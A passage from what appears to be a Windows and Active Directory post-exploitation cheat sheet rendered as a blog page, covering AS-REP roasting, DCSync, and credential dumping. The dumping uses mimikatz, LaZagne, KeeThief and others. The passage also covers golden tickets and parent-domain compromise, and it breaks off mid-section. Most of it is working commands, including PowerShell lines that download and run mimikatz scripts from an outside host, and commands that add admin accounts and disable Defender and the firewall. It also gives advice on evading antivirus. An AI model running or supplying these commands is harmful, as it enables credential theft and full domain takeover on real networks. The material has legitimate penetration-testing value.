&lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt</span><br></pre></td></tr></table></figure><h2 id="4-29-代表烘焙"><a href="#4-29-代表烘焙" class="headerlink" title="4.29 代表烘焙"></a>4.29 代表烘焙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable</span><br><span class="line"></span><br><span class="line">Get-ASRepHash -Domain m0chanAD.local -User victim</span><br><span class="line"></span><br><span class="line">Can also use Rebeus (Reflectively Load .NET Assembly.)</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><h2 id="4-30DCSync（也用于后期利用）"><a href="#4-30DCSync（也用于后期利用）" class="headerlink" title="4.30DCSync（也用于后期利用）"></a>4.30DCSync（也用于后期利用）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. </span><br><span class="line"></span><br><span class="line">#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator</span><br><span class="line"></span><br><span class="line">powershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.6:8000/Invoke-DCSync.ps1&apos;); Invoke-DCSync -PWDumpFormat&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Empire Module: powershell/credentials/mimikatz/dcsync_hashdump</span><br></pre></td></tr></table></figure><h1 id="0x05-exploit后"><a href="#0x05-exploit后" class="headerlink" title="0x05 exploit后"></a>0x05 exploit后</h1><h2 id="5-1-有用的命令"><a href="#5-1-有用的命令" class="headerlink" title="5.1 有用的命令"></a>5.1 有用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net localgroup Administrators m0chan /add</span><br><span class="line"></span><br><span class="line"># Enable RDP</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Turn firewall off</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">Or like this</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">If you get this error:</span><br><span class="line"></span><br><span class="line">CredSSP Error Fix -&gt;</span><br><span class="line"></span><br><span class="line">Add this reg key:</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Disable Windows Defender</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h2 id="5-2-Esenutl-exe转储锁定文件"><a href="#5-2-Esenutl-exe转储锁定文件" class="headerlink" title="5.2 Esenutl.exe转储锁定文件"></a>5.2 Esenutl.exe转储锁定文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)</span><br></pre></td></tr></table></figure><h2 id="5-3-检查是否已启用Powershell日志记录"><a href="#5-3-检查是否已启用Powershell日志记录" class="headerlink" title="5.3 检查是否已启用Powershell日志记录"></a>5.3 检查是否已启用Powershell日志记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure><h2 id="5-4-Run-Seatbelt（绝对必须）"><a href="#5-4-Run-Seatbelt（绝对必须）" class="headerlink" title="5.4 Run Seatbelt（绝对必须）"></a>5.4 Run Seatbelt（绝对必须）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/Seatbelt</span><br><span class="line"></span><br><span class="line">This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win</span><br><span class="line"></span><br><span class="line">BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)</span><br><span class="line">RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13</span><br><span class="line">TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)</span><br><span class="line">UACSystemPolicies     -   UAC system policies via the registry</span><br><span class="line">PowerShellSettings    -   PowerShell versions and security settings</span><br><span class="line">AuditSettings         -   Audit settings via the registry</span><br><span class="line">WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry</span><br><span class="line">LSASettings           -   LSA settings (including auth packages)</span><br><span class="line">UserEnvVariables      -   Current user environment variables</span><br><span class="line">SystemEnvVariables    -   Current system environment variables</span><br><span class="line">UserFolders           -   Folders in C:\Users\</span><br><span class="line">NonstandardServices   -   Services with file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">InternetSettings      -   Internet settings including proxy configs</span><br><span class="line">LapsSettings          -   LAPS settings, if installed</span><br><span class="line">LocalGroupMembers     -   Members of local admins, RDP, and DCOM</span><br><span class="line">MappedDrives          -   Mapped drives</span><br><span class="line">RDPSessions           -   Current incoming RDP sessions</span><br><span class="line">WMIMappedDrives       -   Mapped drives via WMI</span><br><span class="line">NetworkShares         -   Network shares</span><br><span class="line">FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all</span><br><span class="line">AntiVirusWMI          -   Registered antivirus (via WMI)</span><br><span class="line">InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools</span><br><span class="line">RegistryAutoRuns      -   Registry autoruns</span><br><span class="line">RegistryAutoLogon     -   Registry autologon information</span><br><span class="line">DNSCache              -   DNS cache entries (via WMI)</span><br><span class="line">ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)</span><br><span class="line">AllTcpConnections     -   Lists current TCP connections and associated processes</span><br><span class="line">AllUdpConnections     -   Lists current UDP connections and associated processes</span><br><span class="line">NonstandardProcesses  -   Running processeswith file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">  *  If the user is in high integrity, the following additional actions are run:</span><br><span class="line">SysmonConfig          -   Sysmon configuration from the registry</span><br><span class="line"></span><br><span class="line">And more!!</span><br></pre></td></tr></table></figure><h2 id="5-5-Dump-Creds"><a href="#5-5-Dump-Creds" class="headerlink" title="5.5 Dump Creds"></a>5.5 Dump Creds</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(new-object System.Net.WebClient).DownloadString(&apos;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz </span><br><span class="line"></span><br><span class="line">Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.</span><br><span class="line"></span><br><span class="line">mimikatz.exe</span><br><span class="line">privlege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">The safer method is to dump the process memory of LSASS.exe with MiniDump </span><br><span class="line">(https://github.com/3xpl01tc0d3r/Minidump)</span><br><span class="line"></span><br><span class="line">(or) https://github.com/GhostPack/SharpDump</span><br><span class="line"></span><br><span class="line">and send the .bin to Mimikatz locally.</span><br><span class="line"></span><br><span class="line">sekurlsa::minidump C:\users\m0chan\lssas.dmp</span><br><span class="line"></span><br><span class="line">Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.</span><br><span class="line"></span><br><span class="line">Mimikatz Guide</span><br><span class="line"></span><br><span class="line">#Logon Sessions</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPasswords all</span><br><span class="line"></span><br><span class="line">#Dump Cache</span><br><span class="line"></span><br><span class="line">lsadump::cache</span><br><span class="line"></span><br><span class="line">#Dump SAM</span><br><span class="line"></span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><h2 id="5-6-Dump-Creds-2"><a href="#5-6-Dump-Creds-2" class="headerlink" title="5.6 Dump Creds #2"></a>5.6 Dump Creds #2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/AlessandroZ/LaZagne</span><br><span class="line"></span><br><span class="line">laZagne.exe all</span><br><span class="line">laZagne.exe browsers</span><br><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure><h2 id="5-7-SessionGopher"><a href="#5-7-SessionGopher" class="headerlink" title="5.7 SessionGopher"></a>5.7 SessionGopher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Arvanaghi/SessionGopher</span><br><span class="line"></span><br><span class="line">Quietly digging up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP</span><br><span class="line"></span><br><span class="line">SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals</span><br><span class="line"></span><br><span class="line">Invoke-SessionGopher -Thorough</span><br><span class="line"></span><br><span class="line">Import-Module path\to\SessionGopher.ps1;</span><br><span class="line">Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss</span><br></pre></td></tr></table></figure><h2 id="5-8-Dump-Chrome密码（也发布漏洞利用程序）"><a href="#5-8-Dump-Chrome密码（也发布漏洞利用程序）" class="headerlink" title="5.8 Dump Chrome密码（也发布漏洞利用程序）"></a>5.8 Dump Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="5-9-Dump-Process-Memory-w-Mimikittenz"><a href="#5-9-Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="5.9 Dump Process Memory w/ Mimikittenz"></a>5.9 Dump Process Memory w/ Mimikittenz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/putterpanda/mimikittenz</span><br><span class="line"></span><br><span class="line">mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</span><br><span class="line"></span><br><span class="line">The aim of mimikittenz is to provide user-level (non-admin privileged) sensitive data extraction in order to maximise post exploitation efforts and increase value of information gathered per target.</span><br><span class="line"></span><br><span class="line">Invoke-Mimikittenz</span><br></pre></td></tr></table></figure><h2 id="5-10-Dump-KeePass"><a href="#5-10-Dump-KeePass" class="headerlink" title="5.10 Dump KeePass"></a>5.10 Dump KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="5-11-pypykatz"><a href="#5-11-pypykatz" class="headerlink" title="5.11 pypykatz"></a>5.11 pypykatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/pypykatz</span><br><span class="line"></span><br><span class="line">Full python implementation of Mimikatz :D </span><br><span class="line"></span><br><span class="line">pip3 install pypykatz</span><br></pre></td></tr></table></figure><h2 id="5-12-SafetyKatz"><a href="#5-12-SafetyKatz" class="headerlink" title="5.12 SafetyKatz"></a>5.12 SafetyKatz</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SafetyKatz</span><br><span class="line"></span><br><span class="line">Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D </span><br><span class="line"></span><br><span class="line">&quot;SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee&apos;s .NET PE Loader.</span><br><span class="line"></span><br><span class="line">First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtees PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete.&quot;</span><br></pre></td></tr></table></figure><h2 id="5-13-SharpDPAPI"><a href="#5-13-SharpDPAPI" class="headerlink" title="5.13 SharpDPAPI"></a>5.13 SharpDPAPI</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpDPAPI</span><br><span class="line"></span><br><span class="line">Full C Sharp Implementation of Mimikatzs DPAPI features which allows access to DPAPI features.</span><br></pre></td></tr></table></figure><h2 id="5-14-SharpSniper"><a href="#5-14-SharpSniper" class="headerlink" title="5.14 SharpSniper"></a>5.14 SharpSniper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HunnicCyber/SharpSniper</span><br><span class="line"></span><br><span class="line">Often a Red Team engagement is more than just achieving Domain Admin. Some clients will want to see if specific users in the domain can be compromised, for example the CEO.</span><br><span class="line"></span><br><span class="line">SharpSniper is a simple tool to find the IP address of these users so that you can target their box.</span><br><span class="line"></span><br><span class="line">C:\&gt; SharpSniper.exe emusk DomainAdminUser DAPass123</span><br><span class="line"></span><br><span class="line">User: emusk - IP Address: 192.168.37.130</span><br></pre></td></tr></table></figure><h2 id="5-15-SharpLocker"><a href="#5-15-SharpLocker" class="headerlink" title="5.15 SharpLocker"></a>5.15 SharpLocker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Pickfordmatt/SharpLocker</span><br><span class="line"></span><br><span class="line">SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.</span><br></pre></td></tr></table></figure><h2 id="5-16-Check-for-Missing-KB’s"><a href="#5-16-Check-for-Missing-KB’s" class="headerlink" title="5.16 Check for Missing KB’s"></a>5.16 Check for Missing KB’s</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watson.exe</span><br><span class="line">Sherlock.ps1</span><br><span class="line"></span><br><span class="line">Use Watson.exe Assembly and reflectively load .NET Assembly into memory to avoid antivirus. </span><br><span class="line"></span><br><span class="line">More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change certain strings etc)</span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Watson</span><br></pre></td></tr></table></figure><h2 id="5-17-如果管理员-系统，则使用Mimikatz解密EFS文件"><a href="#5-17-如果管理员-系统，则使用Mimikatz解密EFS文件" class="headerlink" title="5.17 如果管理员/系统，则使用Mimikatz解密EFS文件"></a>5.17 如果管理员/系统，则使用Mimikatz解密EFS文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</span><br><span class="line"></span><br><span class="line">cipher /c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.</span><br><span class="line"></span><br><span class="line">privilege::debug </span><br><span class="line">token::elevate </span><br><span class="line">crypto::system /file:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\B53C6DE283C00203587A03DD3D0BF66E16969A55&quot; /export</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot;</span><br><span class="line"></span><br><span class="line">dpapi::masterkey /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Protect\S-1-5-21-494464150-3436831043-1864828003-1001\1eccdbd2-4771-4360-8b19-9d6060a061dc&quot; /password:waza1234/</span><br><span class="line"></span><br><span class="line">dpapi::capi /in:&quot;D:\Users\Gentil Kiwi\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-494464150-3436831043-1864828003-1001\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b&quot; /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b</span><br><span class="line"></span><br><span class="line">openssl x509 -inform DER -outform PEM -in B53C6DE283C00203587A03DD3D0BF66E16969A55.der -out public.pem</span><br><span class="line"></span><br><span class="line">openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_ffb75517-bc6c-4a40-8f8b-e2c555e30e34.pvk -out private.pem</span><br><span class="line"></span><br><span class="line">openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br><span class="line"></span><br><span class="line">certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot</span><br></pre></td></tr></table></figure><h2 id="5-18-UAC绕过"><a href="#5-18-UAC绕过" class="headerlink" title="5.18 UAC绕过"></a>5.18 UAC绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://egre55.github.io/system-properties-uac-bypass/ - Read Ghoul writeup on HTB for more Info </span><br><span class="line"></span><br><span class="line">findstr /C:&quot;&lt;autoElevate&gt;true&quot; </span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\SysWOW64\SystemPropertiesRemote.exe</span><br></pre></td></tr></table></figure><h2 id="5-19-Golden-Ticket-Attack"><a href="#5-19-Golden-Ticket-Attack" class="headerlink" title="5.19 Golden Ticket Attack"></a>5.19 Golden Ticket Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line"># To generate the TGT with NTLM</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_ntlm_hash&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 128 key</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span><br><span class="line">mimikatz # kerberos::golden /domain:&lt;domain_name&gt;/sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt;</span><br><span class="line"></span><br><span class="line"># Inject TGT with Mimikatz</span><br><span class="line">mimikatz # kerberos::ptt &lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Inject Ticket with Rebeus</span><br><span class="line">.\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;</span><br><span class="line"></span><br><span class="line">.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd</span><br></pre></td></tr></table></figure><h2 id="5-20-子域将危害森林"><a href="#5-20-子域将危害森林" class="headerlink" title="5.20 子域将危害森林"></a>5.20 子域将危害森林</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC</span><br><span class="line"></span><br><span class="line">Tree = Set of domains using same name space (DNS Name)</span><br><span class="line"></span><br><span class="line">Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.m0chan.com.</span><br><span class="line"></span><br><span class="line">Forest = Largest Structure composed of all trees.</span><br><span class="line"></span><br><span class="line">Most trees are linked with dual sided trust relationships to allow for sharing of resources.</span><br><span class="line"></span><br><span class="line">By default the first domain created if the Forest Root.</span><br><span class="line"></span><br><span class="line">Lets say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create </span><br><span class="line"></span><br><span class="line">Covert-NameToSid target.domain.com\krbtgt</span><br><span class="line">S-1-5-21-2941561648-383941485-1389968811-502</span><br><span class="line"></span><br><span class="line">Replace 502 with 519 to represent Enterprise Admins</span><br><span class="line"></span><br><span class="line">Create golden ticket and attack parent domain. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This will not work if there is SID Filtering in place for respective target domain.</span><br><span class="line"></span><br><span class="line">harmj0ys article explains it best. </span><br><span class="line"></span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</span><br></pre></td></tr></table></figure><h2 id="5-21-Dump-NTDS-dit"><a href="#5-21-Dump-NTDS-dit" class="headerlink" title="5.21 Dump NTDS.dit"></a>5.21 Dump NTDS.dit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 